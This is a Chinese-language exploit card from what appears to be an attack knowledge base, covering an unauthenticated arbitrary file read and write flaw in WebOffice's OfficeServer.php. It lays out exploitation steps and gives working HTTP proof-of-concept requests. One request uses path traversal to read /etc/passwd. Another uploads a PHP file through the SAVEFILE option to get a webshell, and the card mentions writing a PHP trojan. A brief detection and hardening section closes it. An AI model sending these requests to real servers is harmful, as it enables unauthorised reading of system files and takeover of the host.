---
id: web-generic-file-upload-weboffice-officeserver-loadfile-savefile-arbitrary-read-write
title: WebOffice OfficeServer.php 暴露在静态目录：FormData 控制 OPTION=LOADFILE/SAVEFILE 任意文件读 + 任意写 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: weboffice-officeserver-loadfile-savefile-arbitrary-read-write
aliases:
- OfficeServer.php
- WebOffice 任意文件读取
- WebOffice 任意文件上传
- LOADFILE SAVEFILE
- FormData OPTION
- /static/lib/weboffice/js/OfficeServer.php
tags:
- php
- weboffice
- file-read
- file-upload
- arbitrary-write
- path-traversal
- webshell
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V522
  verified_at: '2026-11-11T13:21:41+08:00'
  notes: 已通读原文并逐张核对33张截图：图19 OfficeServer.php 源码与卡片一致——$FormData=$_REQUEST['FormData']、json_decode(str_replace('\\"','"',$FormData))、$mFilePath=$_SERVER['DOCUMENT_ROOT'].$de_json->FILEPATH、switch(OPTION)：LOADFILE 走 file_exists/fopen/fread/header/echo，SAVEFILE 走 is_uploaded_file+$_FILES['FileData']['tmp_name']+move_uploaded_file；图18 GET 该静态路径返回200；图22 LOADFILE 读文件成功（响应 Content-Disposition attachment+文件内容）；图23 SAVEFILE 写222.php后浏览器访问到 phpinfo，写入并执行已证明；图20/21 显示 FormData JSON 可控。原文 PoC 的 LOADFILE/SAVEFILE 报文与卡片一致。dedup 推荐 new，related 候选 chamilo bigupload 与 iWebOffice DBSTEP 均为不同组件/协议（前者直接 multipart 上传、后者自定义 DBSTEP 文本协议），非同链；dup-scan.json 无涉及 pair。未实机复现。
---

## 一句话结论

WebOffice 组件自带的 `\web\static\lib\weboffice\js\OfficeServer.php` 被直接放在静态目录、可匿名访问：它把 `$_REQUEST['FormData']` 当 JSON 解析，按 `OPTION` 分流——`LOADFILE` 用 `file_exists/fopen/fread` 读取 `$_SERVER['DOCUMENT_ROOT'] . FILEPATH`，`SAVEFILE` 用 `move_uploaded_file($_FILES['FileData']['tmp_name'], $_SERVER['DOCUMENT_ROOT'] . FILEPATH)` 落盘；`FILEPATH` 未规范化，`../` 可逃逸出根目录，从而任意文件读（如 `/etc/passwd`）与任意 PHP 写入 getshell。

## 原理

- **静态目录暴露**：文件位于 `/static/lib/weboffice/js/` 下，Web 服务器按静态资源直接解析 PHP（未加访问控制），攻击者无需登录即可访问；`GET /static/lib/weboffice/js/OfficeServer.php` 返回 200 即证明存在。
- **请求参数结构**：`$FormData = $_REQUEST["FormData"]; $de_json = json_decode($FormData); $mFilePath = $_SERVER["DOCUMENT_ROOT"] . $de_json->FILEPATH; $mOption = $de_json->OPTION;` 然后 `switch ($mOption)`。
- **LOADFILE 任意读**：`file_exists($mFilePath)` 后 `fopen($mFilePath,'rb')`、`fread` 全文件并 `echo`，响应头设置 `Content-Disposition: attachment; filename=...`；`FILEPATH=/../../../../../../etc/passwd` 时 DOCUMENT_ROOT 前缀被 `..` 抵消，读到系统文件。
- **SAVEFILE 任意写**：`is_uploaded_file($_FILES['FileData']['tmp_name'])` 后 `move_uploaded_file(..., $mFilePath)`；`FILEPATH` 可传绝对路径或带 `..` 的相对路径，写入任意 PHP 进程可写位置；写到 Web 根下 `.php` 即执行。
- **无路径边界**：代码只做 `json_decode` 与字符串拼接，没有 `realpath`/`basename`/目录白名单；`str_replace('\\"','"')` 只是兼容转义，不提供安全校验。
- **前提**：OfficeServer.php 被部署且可访问；PHP 进程对目标路径有读/写权限；`file_uploads=On`（SAVEFILE）；Web 服务器对写入目录按 PHP 解析。

## 触发条件

- 目标部署了 WebOffice 组件，且 `/static/lib/weboffice/js/OfficeServer.php`（或类似路径）可匿名访问。
- `FormData` 参数未被前置 WAF 拦截（JSON 内可含 `..` 与绝对路径）。
- LOADFILE：PHP 进程对目标文件可读；SAVEFILE：对目标目录可写且上传功能开启。
- 写入的扩展名被 Web 服务器解析（`.php`/`.phtml` 等）。

## 利用步骤

1. 探测：`GET /static/lib/weboffice/js/OfficeServer.php`，返回 200/源码报错说明组件存在。
2. 任意读：`GET /static/lib/weboffice/js/OfficeServer.php?FormData={"OPTION":"LOADFILE","FILEPATH":"/../../../../../../../../../../../etc/passwd"}`，响应体即文件内容（`Content-Disposition: attachment`）。
3. 任意写：向同一 URL 发 multipart，`FormData` 用 JSON 指定 `{"OPTION":"SAVEFILE","FILEPATH":"/shell.php"}`，文件字段名 `FileData`，内容为 PHP 木马；`move_uploaded_file` 成功后访问 `/shell.php`。
4. 若根目录不可写，改用相对 `FILEPATH` 指向可写的 Web 子目录，或先 LOADFILE 读取配置定位路径。

## PoC

```http
GET /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22LOADFILE%22,%22FILEPATH%22:%22/../../../../../../../../../../../etc/passwd%22} HTTP/1.1
Host: target
```

```http
POST /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22SAVEFILE%22,"FILEPATH":"/222.php"} HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk

------WebKitFormBoundaryQayVsySyhSwgpmLk
Content-Disposition: form-data; name="FileData"; filename="222.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryQayVsySyhSwgpmLk--
```

## 变体与关联

- 变体：`FILEPATH` 也可用绝对路径（如 `C:/phpstudy_pro/WWW/1.php`）直接写入；`RECORDID`/`FILETYPE` 用于下载响应头伪装，不影响读写路径。
- 变体：若 PHP 禁用了 `move_uploaded_file` 或 `file_uploads=Off`，SAVEFILE 失败但 LOADFILE 仍可任意读；反之读受限时仍可尝试写。
- 关联：[[web-generic-file-upload-iweboffice-dbstep-custom-protocol-waf-bypass]]（同属 iWebOffice/WebOffice 家族的另一个上传协议入口，WAF 绕过思路不同）、[[web-php-file-inclusion-thinkphp-view-template]]（PHP 任意文件读的另一种入口）。
- 边界：组件已删除/重命名、Web 服务器禁止访问该路径、`open_basedir` 限制、目标目录不可写时利用失败。

## 检测与防御

- 检测：访问日志中出现 `/static/lib/weboffice/js/OfficeServer.php` 且带 `FormData`、`OPTION=LOADFILE/SAVEFILE`、`../` 或绝对路径；PHP 进程读取 `/etc/passwd` 等敏感文件；静态目录下出现新的 `.php` 文件。
- 防御：删除或禁止访问生产环境不需要的 OfficeServer.php（在 Nginx/Apache 对该路径 deny）；升级/替换 WebOffice 组件；对 `FILEPATH` 做 realpath + 目录白名单校验；`open_basedir` 限制；上传目录禁 PHP 解析。
- 加固：静态目录中禁止放置可执行脚本，统一把第三方组件移到非 Web 根目录；对所有文件读写接口做路径规范化与权限校验。
